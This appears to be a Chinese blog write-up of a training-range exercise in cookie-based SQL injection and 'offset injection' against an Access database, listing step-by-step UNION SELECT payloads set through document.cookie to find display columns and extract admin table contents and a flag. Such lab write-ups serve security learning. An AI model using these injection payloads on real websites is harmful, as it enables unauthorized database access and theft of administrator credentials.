---
date: "2020-12-17T00:00:00Z"
description: some word here
keywords: SQL注入
tags:
- SQL注入
- 安全
title: SQL注入-偏移注入
---

# 偏移注入

cookie 注入是类似于 POST 或者 GET 传参方式的一种。在 post 或 get 传入参数被反制的时候，可以尝试使用 cookie 注入。

常见的修改 cookie 值的方式有以下几种

1. 浏览器，开发者工具 ，console 控制台。
	+ `documents.cookie="id=171"`
	+ `documents.cookie="id="+escape("171 order by 11")` 。 其中 `escape` 为 js 函数， 作用是进行 url 编码。
2. 浏览器插件
3. burpsuite 抓包修改


# access 数据库

1. access 本身没有库的概念， 更像是 **表的集合**
2. access 本身没有系统自带库， 不能像 mysql 那样通过 information_schema 查询用户信息。 因此大多情况下只能通过爆破手段获取信息。


## 靶场

> https://hack.zkaq.cn/battle/target?id=bd45ae05e752d860


### 探测注入

```
http://59.63.200.79:8004/shownews.asp?id=171 and 1=2
```

![](https://nc0.cdn.zkaq.cn/md/8461/4722d484f7e75251b91aab6d356381bc_60560.png)

通过报错可以确认， 网站做了一定反制， 禁止了常用的注入字段。

### 测试 cookie

使用浏览器开发者工具，尝试 cookie 注入

```bash
# 1. 删除地址栏中的 id 参数， 转而使用 cookie 传入
http://59.63.200.79:8004/shownews.asp

## console
document.cookie="id=171"
```

![](https://nc0.cdn.zkaq.cn/md/8461/d32a58feb653f16fc7c5e97bae600ef3_62109.png)

页面显示正常， 存在 cookie 注入可能性

**探测显示点**

```
# console
document.cookie="id="+escape("171 and 1=2 union select 1,2,3,4,5,6,7,8,9,10 from admin")
```

![](https://nc0.cdn.zkaq.cn/md/8461/6226b8ae26b7b23b0bc2efbdded1b745_34016.png)

显示点为 `2,3`

使用以下联合查询，发现无法实现偏移注入。 

```sql
union select *,1,2,3,4 from admin
```

> 判断： admin 的字段大于 10 ，所以无法 union 实现。

本则， 开发逻辑是相同的原则， 尝试其他页面是否可以注入， 在

**产品展示页面**， 字段数有 26个。

http://59.63.200.79:8004/ProductShow.asp

```
document.cookie="id="+escape("105 order by 26")
```

**寻找显示点**

```bash
document.cookie="id="+escape("105 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from admin")
```

结果为 3，5，7
![](https://nc0.cdn.zkaq.cn/md/8461/e8169801dd589d514bd2088039f627ea_24869.png)

探测 admin 表字段数

```bash
document.cookie="id="+escape("105 and 1=2 union select 1,2,3,4,5,6,7,8,9,10,* from admin")
```

成功，表示 admin 有16个字段。


通过 三次偏移 (`select *`, `select 1,`, `select 1,2,*`)  得到计数如下。

![](https://nc0.cdn.zkaq.cn/md/8461/c8f140c556d0e1fc936d2f934fc61eb5_52580.png)

这些连续的数字也像是16进制编码。

#### 分析网站远吗

通过对比发现， 除了 3，5，7 有变化之外， 显示的图片也出错了。

![](https://nc0.cdn.zkaq.cn/md/8461/262656d2fa2322e923a610ea0dc189d3_96412.png)

或许，这里也是一个注入点。

重新构造token， 方便搜索

```
document.cookie="id="+escape("105 and 1=2 union select 10001,10002,10003,10004,10005,10006,10007,10008,10009,100010,100011,100012,100013,100014,100015,100016,100017,100018,100019,100020,100021,100022,100023,100024,100025,100026 from admin")
```

**查看网页源代码**

```html
 <a href="100025" target="_blank"><img src=100025 width="450" height="350" border="0" style="BORDER-LEFT-COLOR: #cccccc; BORDER-BOTTOM-COLOR: #cccccc; BORDER-TOP-COLOR: #cccccc; BORDER-RIGHT-COLOR: #cccccc" ></a>
```

![](https://nc0.cdn.zkaq.cn/md/8461/c98f82089563ebbdd2dff7108017bfd8_41835.png)

发现原本图片问题，本应该是 URL 的地方也是注入点。并且位置偏后


> 浪费了大把时间猜测

**sql语句要写  `admin.*` 才有结果**， 语法结构和 mysql 还有出入。


```
document.cookie="id="+escape("105 and 1=2 union select 1,2,3,4,5,6,7,8,9,admin.*,23 from admin")
```

```html
<a href="
	zkaq{f0e12dafb6}
" target="_blank"><img src=zkaq{f0e12dafb6} width="450" height="350" border="0" style="BORDER-LEFT-COLOR: #cccccc; BORDER-BOTTOM-COLOR: #cccccc; BORDER-TOP-COLOR: #cccccc; BORDER-RIGHT-COLOR: #cccccc" ></a>

```
